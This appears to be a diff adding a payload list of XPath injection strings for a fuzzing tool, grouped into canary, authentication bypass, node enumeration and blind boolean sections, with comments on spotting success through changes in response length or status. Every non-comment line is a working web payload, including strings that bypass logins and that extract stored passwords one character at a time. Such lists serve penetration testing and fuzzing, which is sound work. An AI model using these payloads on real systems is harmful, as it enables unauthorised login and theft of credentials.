@@ -1,0 +1,37 @@
+# ==================================================================
+#  XPATH INJECTION PAYLOADS (single file)
+#  One payload per line. "#" lines are comments (pyintruder skips them).
+#  XPath queries an XML doc (often a login: //user[name='X' and pass='Y']).
+#  Detection is BEHAVIOURAL: auth bypass -> you get logged in / more nodes return
+#  (watch response LENGTH/STATUS change vs baseline). Blind: boolean length diff.
+#  All transmit raw (no '&'/'#').
+# ==================================================================
+
+# ---- 0. CANARY / detection — auth bypass (response returns more / login OK) ----
+' or '1'='1
+' or ''='
+
+# ---- 1. Auth bypass ----
+" or ""="
+' or 1=1 or ''='
+' or '1'='1' or ''='
+x' or name()='username' or 'x'='y
+') or ('1'='1
+') or true() or ('
+' or true() or '
+admin' or '1'='1
+' or position()=1 or '
+
+# ---- 2. Break out / enumerate nodes ----
+']|//*|//foo['
+'|//user/*|'
+'|//*|'
+count(//user)
+//user[1]/password
+//*[contains(name(),'pass')]
+
+# ---- 3. Blind — boolean (length/behaviour differs) ----
+' and string-length(//user[1]/password)>5 or ''='
+' and substring(//user[1]/password,1,1)='a' or ''='
+' and count(//user)=3 or ''='
+' and //user[1]/password[1]='admin' or ''='
